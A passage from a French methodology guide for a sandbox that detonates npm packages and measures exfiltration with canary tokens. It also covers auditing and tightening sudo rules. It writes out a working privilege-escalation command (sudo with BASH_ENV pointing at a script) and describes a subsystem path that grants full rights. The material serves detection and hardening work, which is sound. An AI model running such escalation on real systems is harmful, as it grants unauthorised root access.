l'hôte, et c'est `npm install` (voir la section RCE) : la vérifier avant tout le reste.

Conséquence de méthode, à appliquer quand la tentation de durcir arrive :

- énumérer les lignes du scénario qui s'exécutent **hors** du conteneur (installation,
  copie du tarball, orchestration) ; elles seules portent un risque paquet→hôte ;
- l'hygiène de la machine (groupes, élévation, clés, mots de passe) ne rend pas la mesure
  plus juste et ne change aucun chiffre : la traiter à part, brièvement, jamais à la place
  du travail de mesure ;
- le vrai défaut restant d'un banc recevable est presque toujours un **trou
  d'instrumentation** (un enfant `sh -c` à environnement vidé échappe au journal), pas une
  priorité d'escalade. Une répétition de plus ne le révèle pas : seule une sonde dédiée le
  fait.

Un après-midi passé à fermer des chemins d'élévation alors que les sondes sont
conteneurisées est du travail perdu, et l'utilisateur le dit avant qu'on s'en aperçoive :
« en sandbox ils sont isolés de tout ça ». Quand il le dit, il a raison — revenir à la
mesure immédiatement.

## Durcir les droits : la règle, le helper, et les chemins qu'on oublie

`SETENV` dans une règle d'élévation ne limite rien : `sudo -n BASH_ENV=/tmp/evil.sh
/bin/bash <script autorisé>` exécute du code en root — constaté par exécution, uid 0 écrit
dans /tmp. Les paramètres se passent donc en **arguments** du script privilégié, jamais par
l'environnement, et la règle n'a ni `SETENV` ni `env`. Une validation de syntaxe qui répond
« parsed OK » ne dit rien sur ce que la règle autorise ; seul un essai d'injection le dit.

Quatre règles, dans cet ordre :

1. **Pas de joker en fin de règle.** Un joker laisse passer n'importe quel argument, y
compris des options de l'outil sous-jacent et un nom de cible arbitraire. Quand l'appelant
n'a pas besoin de paramétrer, écrire la règle sans joker.
2. **Un helper à verbes figés, pas un passe-plat.** Chaque verbe est une branche figée,
sans variable non validée ; aucun nom de cible ni option ne vient de l'appelant. Un helper
qui relaie les arguments jusqu'à l'outil rend la règle équivalente à l'accès complet.
3. **Énumérer tous les chemins, pas seulement celui qu'on a écrit.** Deux autres subsistent
après avoir nettoyé la règle : l'appartenance au groupe de l'outil (accès total sans mot de
passe) et l'appartenance au groupe d'administration (accès avec le mot de passe de
l'utilisateur — `passwd -S <user>` répond `P` quand ce chemin est actif). Retirer
l'appartenance, puis revérifier.
4. **La contre-épreuve s'exécute avec l'identité à laquelle la règle s'applique.** Un test
lancé depuis un compte plus puissant ne teste rien, puisque ce compte n'y est pas soumis ;
il faut passer par `su - <user> -c '…'` et lire le code de retour. Corollaire pour les
groupes : un retrait ne vaut que pour les sessions **ouvertes ensuite** — un shell déjà
lancé garde l'appartenance en mémoire. Vérifier sur la base (`id -nG <user>`), puis dans une
session neuve ; lire les groupes de son propre shell répond sur l'état d'avant.

5. **Le chemin extérieur survit à tout ce qu'on ferme à l'intérieur.** Sur un hôte
   conteneurisé qui tourne derrière un service d'accès Windows, une commande entrant dans
   le sous-système avec l'identité système donne les pleins droits depuis un shell de
   l'hôte, quel que soit l'état de l'élévation et des groupes à l'intérieur. Vérifier la
   liste des comptes autorisés par ce service et, pour chacun, **quel fichier de clés il
   lit réellement** : pour un compte d'administration, le service en ignore un et lit le
   fichier global, qui reste souvent sans restriction. Fermer la clé du compte ordinaire
   pendant que celle du compte d'administration reste ouverte ne change rien — et
   l'annoncer comme un progrès est exactement le défaut qu'on vient de corriger.

La matrice qui vaut preuve : code 2 sur un verbe inconnu, code 1 sur une élévation refusée,
code 0 sur le verbe légitime — et non la relecture du fichier de configuration.

Si l'accès privilégié depuis l'intérieur a été fermé et qu'il reste du travail à faire,
le déléguer à une **autre machine du réseau** qui se connecte à l'hôte par son shell natif
puis entre dans le sous-système. Écrire la correction comme un fichier **livrable** :
idempotent, validation de syntaxe **avant** installation, retrait automatique si elle
échoue. Ce canal reste une porte d'entrée à traiter côté hôte — le noter comme dette.
Helper complet et matrice de tests : `references/durcissement-droits.md`.

**Un run qui expire ne se cite pas.** Un dépassement de délai (`rc=124`, `137`, ou une
durée d'observation au-delà du budget) donne un état partiel : la sonde n'a pas fini de
frapper. Le lecteur doit rendre `CLÉ NON RECEVABLE raisons=run interrompu`, jamais `CLÉ`.

## Passation à un tiers

Quand la correction est confiée à quelqu'un qui n'a pas vécu la session (Claude, un
relecteur, une session future), le dossier doit rendre les trous reproductibles :
avertissement en tête, problèmes numérotés avec le test qui tranche, corrections
échouées documentées comme échouées, passes de vérificateurs verbatim.
Recette complète et arborescence : `references/passation.md`.

**Le paquet de preuve se construit depuis le chemin DÉPLOYÉ**, jamais depuis un miroir
ou une copie de travail : une annexe prise dans le miroir a montré un harnais d'avant le
correctif, et le relecteur a eu raison de refuser le chiffre — le code qu'il lisait
n'était pas celui qui avait tourné. Joindre : `sha256sum` de l'arbre déployé, la même
liste pour la version qui a réellement produit les runs cités, les registres bruts, la
sortie brute du lecteur et l'archive des dossiers de run. Dire **quelle version a
tourné quoi** ; sans cela le relecteur ne peut pas recompter et tout le dossier tombe.

Un test de sécurité qui ne discrimine plus (contre-épreuve impossible à reproduire sur
la version d'outil installée) s'écrit `INCONCLUANT`, **jamais `OK`** — et on ne fige
jamais une vieille version de l'outil pour le faire passer : c'est rouvrir la faille
pour sauver le test.

**Ne jamais soumettre un dossier assemblé en deux temps.** Recueillir un premier lot de
faits, constater qu'il est inexploitable, puis compléter le même fichier laisse cohabiter
l'ancien état (empreintes illisibles, commande qui a échoué) et le nouveau. Les deux
vérificateurs refusent alors **tout** le dossier au titre de la provenance — et ils ont
raison, la pièce jointe contredit le texte. Après chaque passe de collecte, réécrire le
dossier **en entier** depuis les faits frais, et marquer ce qui n'a pas pu être lu plutôt
que le combler.

**Recompter sur une autre machine, avec les seuls fichiers de preuve.** Copier l'archive
des runs, les registres bruts, le lecteur **et `sondes/attendus.json`** : sans ce dernier,
le lecteur rend `BANC NON RECEVABLE` sur chaque run, il refuse de conclure sans attendus.
Faire tourner le **vrai lecteur** là-bas, pas un script improvisé — un contrôle maison qui
cherche la chaîne du canari n'importe où déclare le témoin bavard alors que ses canaris ne
viennent que du semis local ; seuls le canal réseau et l'exécution comptent (piège 16). Un
vérificateur qui commence par contredire est celui qui sert.

## Paquets réels : trier avant de détoner

Une liste de paquets « manqués par tel et tel détecteur » n'est pas un corpus de
malveillants : elle est majoritairement faite de paquets **propres**, que les détecteurs ont eu
raison de laisser passer. Détoner la liste entière produit des journaux vides et zéro règle.
Trier d'abord sur le registre, sans rien exécuter : seuls `preinstall`/`install`/`postinstall`
tournent chez celui qui installe — ni `prepare`, ni `prepublishOnly`, ni l'ancien `prepublish`.
Puis lire les quelques candidats. La règle qui en sort porte sur la **chaîne** (un script
d'installation qui atteint un `bin` lequel ouvre un shell), jamais sur le nom. Mesure, commandes
de tri et tableau des scripts : `references/rappel-paquets-reels.md`.

## Ce qu'un « rien » veut dire

Aucun canari sorti, aucun hôte hors registry, aucun `exec` inattendu, sous
scripts de cycle de vie + bins + exports pilotés + délais écrasés : c'est une
**absence étayée**, pas une innocence. La formuler ainsi, jamais « le paquet
est propre ».

## Un banc ne vaut que par ses refus

Trois refus motivés valent mieux que vingt détections. Les mesurer avant de citer un chiffre :

- **Injection de faute** : copier les événements d'une sonde A dans le dossier d'une sonde B **inscrite au registre** → le lecteur doit répondre `ATTRIBUTION INVALIDE` et le banc `NON RECEVABLE`. Copier dans un tag non inscrit ne prouve rien : il sort `HORS REGISTRE (ignoré)`.
- **Protection retirée** : relancer sans redémarrage du conteneur ; l'orphelin du leurre doit frapper dans le témoin et sortir `ATTRIBUTION INVALIDE — FORGE DÉMONTRÉE`. S'il sort `—`, le test est non concluant, le consigner sans conclure.
- **Concurrence** : deux bancs en parallèle, le second doit sortir `rc=75` immédiatement.

## Le témoin muet est le critère, pas le témoin détecté

Des vérificateurs LLM (Mistral, hy4) ont exigé « `p12-propre` = CLÉ » comme critère de passage. **Ce critère valide un banc contaminé.** Le témoin doit sortir `—`. Un dossier de run périmé, ou les canaris d'une sonde précédente, produisent un `CLÉ` parfaitement crédible : l'exiger revient à exiger la contamination.

## Vérifier un lot hors du lecteur

Le verdict du lecteur ne suffit pas : un lot de runs se contrôle **indépendamment**
(nonces sur toutes les lignes, `fin.json`/`entrees.jsonl`/`summary.json` au bon nonce,
zéro événement étranger, garde et redémarrage `OK`, `npm_rc = 0`, aucun canari d'un
autre suffixe, leurre confiné à sa sonde, canaris d'encodage jamais en clair, étapes
`settle`+`pilote` présentes, durée d'observation). Recette, arborescence attendue et
pièges de l'outil : `references/verification-lot.md`.

**Ton propre script d'agrégation est un suspect avant le banc.** Prendre une ligne
**réelle** du lecteur et reproduire le motif dessus avant de l'écrire : un `^s\d{3}\s`
sur des tags de six caractères ne matche aucune ligne et rapporte « N contrôles positifs
manquants » sur un banc vert, puis « 0 » après correction. Vérifier aussi l'orthographe
exacte des noms de sondes dans cette ligne, jamais de mémoire. Campagne de N runs —
critères binaires fixés d'avance, contrôle positif à chaque run, ancrage par run,
unicité des canaris entre runs : même fichier, section « Campagne de N runs ».

## Mesure honnête

Seul `BANC RECEVABLE` (code 0) se cite. Tout autre verdict : lire la colonne des raisons, ne pas transformer en chiffre.

**Un total unique mélange trois natures et finit démoli.** Classer chaque sonde dans
`attendus.json` — `DETECTION` (un canari sort par un canal réseau), `INTENTION` (la charge
n'a pas pu s'exécuter, le binaire manque dans l'image) et `CONTROLE` (leurre, injection de
faute) — puis publier le décompte **par classe**, jamais un seul nombre. Mesure réelle : un
« 24 CLÉ par run » annoncé valait 19 canaris exfiltrés, 1 configuration client, 1 contact
seul, 2 intentions et 1 contrôle. Le chiffre n'était pas faux par calcul, il était faux par
mélange — et c'est ce mélange qui fait douter de tout le reste. Corollaire : une sonde dont
le binaire est absent ne mesure rien, la répéter trente fois ne remplit pas la case.

**Le code de sortie ne se lit jamais à travers un pipe.** `python3 cles.py b | tail -30` rend le code de `tail`, pas celui du lecteur : un run refusé s'affiche « rc=0 » et le verdict devient une formalité. Rediriger vers un fichier, puis lire le code : `python3 -I cles_scenario3.py b > /tmp/verdict.txt; echo rc=$?`.

**Un chiffre n'est comparable qu'à protocole constant.** Changer le harnais, le plafond, la fenêtre d'observation ou l'image invalide **tous** les runs précédents : ils mesurent un autre banc. Après chaque changement de protocole, réétalonner et joindre à chaque run l'empreinte (`sha256sum`) de l'arbre déployé — seule façon de dire plus tard quel chiffre venait de quelle version.

Le protocole complet, les scripts réels et le journal d'audit vivent sur
`github.com/boris21dd-sketch/sandbox-detonation-npm`. Toute amélioration y est
publiée avec sa mesure (`scripts/publier.sh "titre" "avant → après"`), pour que
l'historique dise ce qui a été corrigé **et ce que ça a changé**.

Le jeton ne doit **jamais** être stocké dans ce dépôt : le remote reste une URL
propre, et `publier.sh` emprunte le jeton du dépôt de travail au moment du push. **Ni passer
en argv** : `git push https://user:token@…` est lisible dans `ps` par tout processus de la
machine. Extraire le jeton dans un fichier en 600 et pousser via `GIT_ASKPASS` (script
`case "$1" in *[Uu]sername*) echo x-access-token;; *) cat /tmp/.pat;; esac`) — et si le jeton
a déjà été posé en clair dans une URL de remote, le considérer comme fuité et le révoquer.
Une URL `https://user:token@…` dans `.git/config` d'un dépôt public finit par
être publiée ou copiée — c'est une fuite en attente.

## Un hook qui lève casse la mesure

Enrichir un hook (`child_process`) sans entourer l'émission d'un `try/catch`
fait échouer l'appel chez le paquet : deux sondes qui passaient sont devenues
muettes, et le banc l'a vu avant moi. **Tout ajout dans un hook s'enveloppe.**
Corollaire : un binaire absent (`curl`, `git`) n'est pas un paquet propre —
l'échec d'exécution s'émet sous `exec_indisponible`.

## Module d'entrée, pas seulement require()

`require.main === module` est **faux** sous `require()` : un loader gardé par ce
test reste invisible pour un harnais qui se contente de charger les entrées. Le
pilote exécute donc aussi le vrai `main` comme **processus node** (`entree`),
puis laisse une **fenêtre de settle** (~8 s, silencieuse) pour les charges
détachées (`spawn detached`, `unref`) qui rendent la main tout de suite.

Preuve exigée : sonde `p16-main-module` qui ne frappe QUE sous `require.main`
— muette avant la passe, CLÉ après. Un banc sans cette sonde ne prouve rien.

## Le plafond des délais ne doit pas couper la fenêtre du harnais

Plafonner `setTimeout` pour faire partir une charge de trois jours est juste, mais le
même plafond s'applique au harnais : la fenêtre de settle du module d'entrée est tombée
de 8 s à 1,6 s, et l'étape qui pilote les exports (`piloter()`) n'était **plus jamais
appelée**. Mesure : le `_sbx_etat.jsonl` du run ne contenait aucune étape `pilote`.
Toute charge déclenchée à l'usage (session WhatsApp, handler d'événement) passait
inaperçue, alors que le banc affichait des `CLÉ` — obtenus par un **autre** canal (le
`postinstall`), ce qui rendait le score crédible et faux.

Règles :

- plafond et horloge se posent dans **chaque** processus instrumenté, pas seulement
  dans la cible : précharger `lib/sbx/temps.js`, avec `syncBuiltinESMExports` pour
  couvrir `node:timers`, `timers/promises`, un délai passé en texte et les
  petits-enfants node ;
- le plafond ne s'applique qu'au code du paquet, jamais à la fenêtre d'observation
  du harnais ;
- **prouver que le harnais est allé au bout** : lire son propre journal d'étapes et
  exiger la séquence complète (`demarrage → … → main → entree_module → pilote →
  fin`). Une étape manquante invalide le run entier, même si toutes les sondes sont
  `CLÉ` et que le lecteur dit `BANC RECEVABLE`.

Corollaire : **dire par quel canal un `CLÉ` a été obtenu**. Lire les événements pour
trouver le canal porteur (`fs.writeFileSync` vs `http.corps`) ; un canari sorti par
écriture de fichier ne prouve pas que le réseau est vu, et un `CLÉ` obtenu par un canal
inattendu ne valide pas la sonde qu'on croyait testée.

## Horloge accélérée (mois/années)

Plafonner les délais ne suffit pas : une charge qui compare des dates
(`Date.now() - installe > 30 jours`) ne se déclenche jamais. Le pilote décale
donc l'horloge du paquet (`_sbx_offset.json` à côté du pilote, `SBX_OFFSET_JOURS`).
**Deux pièges mesurés :**

- **Le budget du harnais doit lire la VRAIE horloge.** En décalant `Date.now()`
  globalement, `reste()` voit 30 jours écoulés et saute tout, vrai code compris :
  la sonde reste muette pour la mauvaise raison. Capturer `VRAI_NOW_MS` avant le
  décalage et l'utiliser pour le budget uniquement.
- **`sudo` ne propage pas l'environnement.** Les paramètres de scénario passent
  par `sudo -n env VAR=... bash detoner-obs.sh`, et à l'intérieur du conteneur par
  un **fichier** (l'environnement du paquet est contrôlé par le harnais).

Contrôle obligatoire : installé il y a 1 jour + offset 0 → muet ; même paquet +
offset 30 → la sonde frappe. Sans ce couple, le test ne prouve rien.

## Enchaînement

0. Construire ou rejouer le banc **avant** de promettre quoi que ce soit :
   `python3 scripts/fabrique_sondes.py` puis
   `bash scripts/sbx-scenario3.sh /tmp/liste_sondes.tsv <prefixe> 120`.
   Avant chaque sonde, `scripts/verifier_banc.sh --avant` (état des conteneurs,
   journal réseau, dossier de sortie) ; après chaque sonde,
   `scripts/verifier_banc.sh <tag>` — code 0 = mesure valable, 1 = banc invalide
   à rejouer, 2 = détection non loguée à rejouer **sans jamais la compter muette**.
   Le contrôle positif (une sonde qui doit toujours frapper) passe avant de citer
   le moindre chiffre.
1. `bash scripts/sbx-scenario3.sh <liste.tsv nom\ttgz> <prefixe> 120`
2. `python3 scripts/cles_scenario3.py <prefixe>` → une ligne par paquet, `CLÉ`
   ou `—`, avec les hôtes et les canaris sortis.
3. Verser les clés dans le rapport ; ne jamais promouvoir une règle statique sur
   la base d'un run partiel. **Recompter mécaniquement tout total annoncé**
   (« 6 sur 12 ») depuis les fichiers de résultats, jamais de mémoire : un
   décompte faux invalide tout le reste du rapport, même si les règles sont justes.
